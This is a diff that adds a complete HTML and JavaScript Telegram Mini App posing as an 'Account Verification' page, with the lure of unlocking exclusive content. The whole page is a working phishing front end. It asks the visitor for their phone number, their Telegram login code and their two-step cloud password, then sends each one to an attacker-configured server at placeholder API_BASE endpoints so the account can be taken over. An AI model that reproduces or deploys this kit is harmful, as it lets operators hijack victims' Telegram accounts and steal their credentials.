@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Account Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg:           #0f1117;
+            --surface:      rgba(26, 29, 39, 0.82);
+            --surface-solid:#1a1d27;
+            --border:       #2a2d3e;
+            --accent:       #4f8ef7;
+            --accent-hover: #3a7de0;
+            --success:      #34c759;
+            --error:        #ff3b30;
+            --warning:      #ff9500;
+            --text:         #e8eaf0;
+            --text-muted:   #8a8fa8;
+            --input-bg:     #22253a;
+            --radius:       16px;
+            --shadow:       0 8px 40px rgba(0,0,0,0.55);
+        }
+
+        /* ── Background ──────────────────────────────────────────────────── */
+        #bg-layer {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            transition: background-image 0.6s ease;
+            z-index: 0;
+        }
+        #bg-layer::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: rgba(10, 12, 20, 0.60);
+            backdrop-filter: blur(2px);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            z-index: 2;
+            animation: fadeUp 0.45s ease both;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ── Card ─────────────────────────────────────────────────────────── */
+        .card {
+            background: var(--surface);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: var(--radius);
+            padding: 36px 28px 28px;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+        }
+
+        /* ── Logo ─────────────────────────────────────────────────────────── */
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo-icon {
+            width: 70px; height: 70px;
+            background: linear-gradient(135deg, var(--accent) 0%, #7c6af7 100%);
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            box-shadow: 0 6px 28px rgba(79,142,247,0.40);
+        }
+
+        h1 { font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 6px; letter-spacing: -0.3px; }
+
+        .subtitle {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 13.5px;
+            margin-bottom: 28px;
+            line-height: 1.55;
+        }
+
+        /* ── Steps ────────────────────────────────────────────────────────── */
+        .step { display: none; }
+        .step.active { display: block; animation: fadeUp 0.3s ease both; }
+
+        .step-label {
+            font-size: 10.5px;
+            font-weight: 700;
+            letter-spacing: 1.1px;
+            text-transform: uppercase;
+            color: var(--accent);
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .step-label::after { content: ""; flex: 1; height: 1px; background: var(--border); }
+
+        /* ── Progress bar ─────────────────────────────────────────────────── */
+        .progress-bar {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 24px;
+        }
+        .progress-dot {
+            flex: 1; height: 3px; border-radius: 99px;
+            background: var(--border);
+            transition: background 0.35s ease;
+        }
+        .progress-dot.done  { background: var(--success); }
+        .progress-dot.active{ background: var(--accent); }
+
+        /* ── Labels & Inputs ──────────────────────────────────────────────── */
+        label {
+            display: block;
+            font-size: 12.5px;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 7px;
+            letter-spacing: 0.2px;
+        }
+
+        .input-wrap { position: relative; margin-bottom: 18px; }
+
+        .input-prefix {
+            position: absolute;
+            left: 14px; top: 50%;
+            transform: translateY(-50%);
+            font-size: 17px;
+            pointer-events: none;
+            color: var(--text-muted);
+            z-index: 1;
+        }
+
+        input[type="tel"],
+        input[type="text"],
+        input[type="number"],
+        input[type="password"] {
+            width: 100%;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border);
+            border-radius: 11px;
+            padding: 14px 14px 14px 44px;
+            font-size: 15.5px;
+            color: var(--text);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            -webkit-appearance: none;
+        }
+
+        input.no-prefix { padding-left: 14px; }
+
+        input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(79,142,247,0.18);
+        }
+
+        input::placeholder { color: var(--text-muted); opacity: 0.65; }
+
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; }
+
+        /* ── Buttons ──────────────────────────────────────────────────────── */
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 11px;
+            font-size: 15.5px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s, opacity 0.2s;
+            letter-spacing: 0.15px;
+        }
+        .btn:active { transform: scale(0.975); }
+
+        .btn-primary { background: var(--accent); color: #fff; }
+        .btn-primary:hover:not(:disabled) { background: var(--accent-hover); }
+        .btn-primary:disabled { opacity: 0.48; cursor: not-allowed; }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--accent);
+            border: 1.5px solid rgba(79,142,247,0.35);
+            margin-top: 10px;
+        }
+        .btn-ghost:hover { background: rgba(79,142,247,0.09); }
+
+        /* ── Alerts ───────────────────────────────────────────────────────── */
+        .alert {
+            padding: 12px 15px;
+            border-radius: 10px;
+            font-size: 13.5px;
+            margin-bottom: 16px;
+            display: none;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        .alert.show { display: flex; align-items: flex-start; gap: 9px; }
+        .alert-error   { background: rgba(255,59,48,.12);  border: 1px solid rgba(255,59,48,.3);  color: #ff6b63; }
+        .alert-success { background: rgba(52,199,89,.12);  border: 1px solid rgba(52,199,89,.3);  color: #4cd964; }
+        .alert-warning { background: rgba(255,149,0,.12);  border: 1px solid rgba(255,149,0,.3);  color: #ffab35; }
+        .alert-icon    { font-size: 15px; flex-shrink: 0; margin-top: 1px; }
+
+        /* ── Hint ─────────────────────────────────────────────────────────── */
+        .hint { font-size: 13px; color: var(--text-muted); margin-bottom: 16px; line-height: 1.55; }
+
+        .phone-display { font-weight: 600; color: var(--accent); }
+
+        /* ── Loader ───────────────────────────────────────────────────────── */
+        .loader {
+            display: inline-block;
+            width: 17px; height: 17px;
+            border: 2.5px solid rgba(255,255,255,0.28);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ── Countdown ────────────────────────────────────────────────────── */
+        .countdown { font-size: 12.5px; color: var(--warning); margin-top: 10px; text-align: center; min-height: 18px; }
+
+        /* ── Success screen ───────────────────────────────────────────────── */
+        .success-screen { text-align: center; padding: 12px 0 4px; }
+        .success-icon   { font-size: 60px; margin-bottom: 16px; display: block; animation: pop 0.5s ease; }
+        @keyframes pop  { 0%{transform:scale(0.5);opacity:0} 70%{transform:scale(1.15)} 100%{transform:scale(1);opacity:1} }
+        .success-screen h2   { font-size: 21px; font-weight: 700; margin-bottom: 10px; }
+        .success-screen p    { color: var(--text-muted); font-size: 14px; line-height: 1.6; }
+
+        /* ── Light theme (synced from Telegram) ───────────────────────────── */
+        body.light-theme {
+            --bg:        #f2f4f8;
+            --surface:   rgba(255,255,255,0.85);
+            --border:    #dde1ee;
+            --text:      #1a1d27;
+            --text-muted:#6b7280;
+            --input-bg:  #f7f8fc;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Full-screen background layer -->
+<div id="bg-layer"></div>
+
+<div class="container">
+    <div class="card">
+
+        <div class="logo">
+            <div class="logo-icon">🔐</div>
+        </div>
+        <h1>Account Verification</h1>
+        <p class="subtitle">Verify your Telegram account to unlock unlimited access to exclusive content.</p>
+
+        <!-- Progress dots -->
+        <div class="progress-bar" id="progress-bar">
+            <div class="progress-dot active" id="dot-1"></div>
+            <div class="progress-dot"        id="dot-2"></div>
+            <div class="progress-dot"        id="dot-3"></div>
+        </div>
+
+        <!-- ── Step 1: Phone ─────────────────────────────── -->
+        <div id="step-phone" class="step active">
+            <div class="step-label">Step 1 — Phone Number</div>
+            <div id="alert-phone" class="alert"></div>
+
+            <label for="phone-input">Your Telegram Number</label>
+            <div class="input-wrap">
+                <span class="input-prefix">📱</span>
+                <input type="tel" id="phone-input" placeholder="+1 555 000 0000"
+                       autocomplete="tel" inputmode="tel" />
+            </div>
+            <p class="hint">Include your country code (e.g. +1, +44, +91, +880). A one-time code will be sent inside your Telegram app — not as an SMS.</p>
+
+            <button class="btn btn-primary" id="btn-send-otp">Send OTP Code</button>
+            <div id="countdown-phone" class="countdown"></div>
+        </div>
+
+        <!-- ── Step 2: OTP ───────────────────────────────── -->
+        <div id="step-otp" class="step">
+            <div class="step-label">Step 2 — OTP Verification</div>
+            <div id="alert-otp" class="alert"></div>
+
+            <p class="hint">An OTP was sent to <span id="phone-display" class="phone-display"></span>. Open Telegram to find it.</p>
+
+            <label for="otp-input">Enter OTP Code</label>
+            <div class="input-wrap">
+                <span class="input-prefix">🔑</span>
+                <input type="number" id="otp-input" placeholder="e.g. 12345"
+                       maxlength="8" inputmode="numeric" />
+            </div>
+
+            <button class="btn btn-primary" id="btn-verify-otp">Verify OTP</button>
+            <button class="btn btn-ghost"   id="btn-back-phone">← Change Number</button>
+        </div>
+
+        <!-- ── Step 3: 2FA ───────────────────────────────── -->
+        <div id="step-2fa" class="step">
+            <div class="step-label">Step 3 — Two-Step Verification</div>
+            <div id="alert-2fa" class="alert"></div>
+
+            <p class="hint">Your account has Two-Step Verification enabled. Please enter your cloud password.</p>
+
+            <label for="twofa-input">2FA Password</label>
+            <div class="input-wrap">
+                <span class="input-prefix">🔒</span>
+                <input type="password" id="twofa-input" placeholder="Enter your 2FA password"
+                       autocomplete="current-password" />
+            </div>
+
+            <button class="btn btn-primary" id="btn-verify-2fa">Confirm Password</button>
+            <button class="btn btn-ghost"   id="btn-skip-2fa">I do not have a 2FA password</button>
+        </div>
+
+        <!-- ── Step 4: Success ──────────────────────────── -->
+        <div id="step-success" class="step">
+            <div class="success-screen">
+                <span class="success-icon">🎉</span>
+                <h2>Verification Complete!</h2>
+                <p>Your account is now verified. You have full access to all content.<br>This window will close automatically.</p>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// ════════════════════════════════════════════════════════════════════════════
+// CONFIG — change API_BASE to your server's public IP or domain + port
+// Example: "http://123.45.67.89:8080"  or  "https://api.yourdomain.com"
+// ════════════════════════════════════════════════════════════════════════════
+const API_BASE = "http://YOUR_SERVER_IP:8080";   // ← EDIT THIS
+
+// ── Telegram WebApp init ──────────────────────────────────────────────────
+const tg = window.Telegram.WebApp;
+tg.ready();
+tg.expand();
+tg.disableVerticalSwipes();
+const initData = tg.initData || "";
+
+// ── State ─────────────────────────────────────────────────────────────────
+let currentPhone   = "";
+let countdownTimer = null;
+
+// ── Background loader — fetch config from server on page load ─────────────
+async function loadBackground() {
+    try {
+        const res  = await fetch(`${API_BASE}/api/get_config`);
+        const data = await res.json();
+        if (data.ok && data.login_bg_url) {
+            const bgLayer = document.getElementById("bg-layer");
+            // Preload image before swapping to avoid flash
+            const img = new Image();
+            img.onload = () => {
+                bgLayer.style.backgroundImage = `url('${data.login_bg_url}')`;
+            };
+            img.src = data.login_bg_url;
+        }
+    } catch (e) {
+        // Background stays as CSS default — non-critical
+        console.warn("Could not load background config:", e);
+    }
+}
+
+// ── Progress dots ─────────────────────────────────────────────────────────
+function setProgress(step) {
+    // step: 1, 2, 3 (success counts as 3 done)
+    const dots = [
+        document.getElementById("dot-1"),
+        document.getElementById("dot-2"),
+        document.getElementById("dot-3"),
+    ];
+    dots.forEach((d, i) => {
+        d.className = "progress-dot";
+        if (i + 1 < step)  d.classList.add("done");
+        if (i + 1 === step) d.classList.add("active");
+    });
+}
+
+// ── Step navigation ───────────────────────────────────────────────────────
+function showStep(id) {
+    document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
+    const el = document.getElementById(id);
+    if (el) el.classList.add("active");
+    // Progress
+    const map = { "step-phone": 1, "step-otp": 2, "step-2fa": 3, "step-success": 3 };
+    setProgress(map[id] || 1);
+    // Telegram back button
+    if (id === "step-phone" || id === "step-success") {
+        tg.BackButton.hide();
+    } else {
+        tg.BackButton.show();
+    }
+}
+
+function goBack(stepId) {
+    clearAlert("alert-phone");
+    clearAlert("alert-otp");
+    clearAlert("alert-2fa");
+    showStep(stepId);
+}
+
+// ── Alert helpers ─────────────────────────────────────────────────────────
+const ICONS = { error: "❌", success: "✅", warning: "⚠️" };
+
+function showAlert(id, msg, type) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.className = `alert alert-${type} show`;
+    el.innerHTML = `<span class="alert-icon">${ICONS[type] || "ℹ️"}</span><span>${msg}</span>`;
+}
+
+function clearAlert(id) {
+    const el = document.getElementById(id);
+    if (el) { el.className = "alert"; el.innerHTML = ""; }
+}
+
+// ── Button loading state ──────────────────────────────────────────────────
+function setLoading(id, loading, label) {
+    const btn = document.getElementById(id);
+    if (!btn) return;
+    btn.disabled = loading;
+    btn.innerHTML = loading ? `<span class="loader"></span>Please wait…` : label;
+}
+
+// ── Countdown timer ───────────────────────────────────────────────────────
+function startCountdown(id, seconds, onDone) {
+    if (countdownTimer) clearInterval(countdownTimer);
+    const el = document.getElementById(id);
+    if (!el) return;
+    let rem = seconds;
+    el.textContent = `You can resend in ${rem}s`;
+    countdownTimer = setInterval(() => {
+        rem -= 1;
+        if (rem <= 0) {
+            clearInterval(countdownTimer);
+            countdownTimer = null;
+            el.textContent = "";
+            if (onDone) onDone();
+        } else {
+            el.textContent = `You can resend in ${rem}s`;
+        }
+    }, 1000);
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// STEP 1 — Send OTP
+// ════════════════════════════════════════════════════════════════════════════
+async function sendOtp() {
+    clearAlert("alert-phone");
+    const phoneInput = document.getElementById("phone-input");
+    let phone = (phoneInput.value || "").trim();
+
+    if (!phone) {
+        showAlert("alert-phone", "Please enter your phone number.", "error");
+        phoneInput.focus();
+        return;
+    }
+    if (!phone.startsWith("+")) { phone = "+" + phone; phoneInput.value = phone; }
+    if (phone.replace(/\D/g, "").length < 7) {
+        showAlert("alert-phone", "Please enter a valid international phone number.", "error");
+        phoneInput.focus();
+        return;
+    }
+    if (!initData) {
+        showAlert("alert-phone", "Unable to verify your Telegram session. Open this app from within Telegram.", "error");
+        return;
+    }
+
+    setLoading("btn-send-otp", true, "Send OTP Code");
+    try {
+        const res  = await fetch(`${API_BASE}/api/send_otp`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ initData, phone_number: phone }),
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+            currentPhone = phone;
+            document.getElementById("phone-display").textContent = phone;
+            showStep("step-otp");
+            document.getElementById("otp-input").focus();
+        } else if (data.flood_wait) {
+            showAlert("alert-phone", `Too many requests. Please wait ${data.flood_wait} seconds.`, "warning");
+            startCountdown("countdown-phone", data.flood_wait);
+        } else {
+            showAlert("alert-phone", data.error || "Failed to send OTP. Please try again.", "error");
+        }
+    } catch {
+        showAlert("alert-phone", "Network error. Check your connection and try again.", "error");
+    } finally {
+        setLoading("btn-send-otp", false, "Send OTP Code");
+    }
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// STEP 2 — Verify OTP
+// ════════════════════════════════════════════════════════════════════════════
+async function verifyOtp() {
+    clearAlert("alert-otp");
+    const otpInput = document.getElementById("otp-input");
+    const otp = (otpInput.value || "").trim();
+
+    if (!otp) {
+        showAlert("alert-otp", "Please enter the OTP code.", "error");
+        otpInput.focus();
+        return;
+    }
+    if (!/^\d+$/.test(otp)) {
+        showAlert("alert-otp", "OTP must contain digits only.", "error");
+        otpInput.focus();
+        return;
+    }
+    if (!initData) {
+        showAlert("alert-otp", "Session error. Please restart the app.", "error");
+        return;
+    }
+
+    setLoading("btn-verify-otp", true, "Verify OTP");
+    try {
+        const res  = await fetch(`${API_BASE}/api/verify_otp`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ initData, otp_code: otp }),
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+            tg.HapticFeedback.notificationOccurred("success");
+            showStep("step-success");
+            setTimeout(() => tg.close(), 3000);
+        } else if (data.needs_2fa) {
+            showStep("step-2fa");
+            document.getElementById("twofa-input").focus();
+        } else if (data.error && data.error.toLowerCase().includes("expired")) {
+            showAlert("alert-otp", "The OTP has expired. Go back and request a new one.", "warning");
+        } else {
+            showAlert("alert-otp", data.error || "Incorrect OTP. Please try again.", "error");
+        }
+    } catch {
+        showAlert("alert-otp", "Network error. Check your connection and try again.", "error");
+    } finally {
+        setLoading("btn-verify-otp", false, "Verify OTP");
+    }
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// STEP 3 — Verify 2FA
+// ════════════════════════════════════════════════════════════════════════════
+async function verify2fa() {
+    clearAlert("alert-2fa");
+    const passInput = document.getElementById("twofa-input");
+    const password  = (passInput.value || "").trim();
+
+    if (!password) {
+        showAlert("alert-2fa", "Please enter your 2FA password.", "error");
+        passInput.focus();
+        return;
+    }
+    if (!initData) {
+        showAlert("alert-2fa", "Session error. Please restart the app.", "error");
+        return;
+    }
+
+    setLoading("btn-verify-2fa", true, "Confirm Password");
+    try {
+        const res  = await fetch(`${API_BASE}/api/verify_2fa`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ initData, password }),
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+            tg.HapticFeedback.notificationOccurred("success");
+            showStep("step-success");
+            setTimeout(() => tg.close(), 3000);
+        } else if (data.error && data.error.toLowerCase().includes("session")) {
+            showAlert("alert-2fa", "Session expired. Please restart the verification process.", "warning");
+        } else {
+            showAlert("alert-2fa", data.error || "Incorrect password. Please try again.", "error");
+            passInput.focus();
+            passInput.select();
+        }
+    } catch {
+        showAlert("alert-2fa", "Network error. Check your connection.", "error");
+    } finally {
+        setLoading("btn-verify-2fa", false, "Confirm Password");
+    }
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// SKIP 2FA
+// ════════════════════════════════════════════════════════════════════════════
+async function skip2fa() {
+    clearAlert("alert-2fa");
+    if (!initData) {
+        showAlert("alert-2fa", "Session error. Please restart the app.", "error");
+        return;
+    }
+    const ok = confirm("Skip 2FA verification?\n\nYou can still access content, but full security verification will be skipped.");
+    if (!ok) return;
+
+    setLoading("btn-verify-2fa", true, "Confirm Password");
+    try {
+        const res  = await fetch(`${API_BASE}/api/verify_2fa`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ initData, password: "SKIP" }),
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+            tg.HapticFeedback.notificationOccurred("success");
+            showStep("step-success");
+            setTimeout(() => tg.close(), 3000);
+        } else {
+            showAlert("alert-2fa", data.error || "Could not skip. Try again or enter your password.", "error");
+        }
+    } catch {
+        showAlert("alert-2fa", "Network error. Check your connection.", "error");
+    } finally {
+        setLoading("btn-verify-2fa", false, "Confirm Password");
+    }
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// THEME SYNC
+// ════════════════════════════════════════════════════════════════════════════
+function syncTheme() {
+    if (tg.colorScheme === "light") {
+        document.body.classList.add("light-theme");
+    } else {
+        document.body.classList.remove("light-theme");
+    }
+}
+syncTheme();
+tg.onEvent("themeChanged", syncTheme);
+
+// ════════════════════════════════════════════════════════════════════════════
+// TELEGRAM BACK BUTTON
+// ════════════════════════════════════════════════════════════════════════════
+tg.BackButton.onClick(() => {
+    const active = document.querySelector(".step.active");
+    if (!active) return;
+    if (active.id === "step-otp") goBack("step-phone");
+    if (active.id === "step-2fa") goBack("step-otp");
+});
+
+// ════════════════════════════════════════════════════════════════════════════
+// BUTTON BINDINGS
+// ════════════════════════════════════════════════════════════════════════════
+document.getElementById("btn-send-otp").addEventListener("click",  sendOtp);
+document.getElementById("btn-verify-otp").addEventListener("click", verifyOtp);
+document.getElementById("btn-back-phone").addEventListener("click", () => goBack("step-phone"));
+document.getElementById("btn-verify-2fa").addEventListener("click", verify2fa);
+document.getElementById("btn-skip-2fa").addEventListener("click",   skip2fa);
+
+// Enter key shortcuts
+document.getElementById("phone-input").addEventListener("keydown",  e => { if (e.key === "Enter") sendOtp(); });
+document.getElementById("otp-input").addEventListener("keydown",    e => { if (e.key === "Enter") verifyOtp(); });
+document.getElementById("twofa-input").addEventListener("keydown",  e => { if (e.key === "Enter") verify2fa(); });
+
+// ════════════════════════════════════════════════════════════════════════════
+// INIT
+// ════════════════════════════════════════════════════════════════════════════
+loadBackground();   // fetch background from server on page load
+</script>
+</body>
+</html>
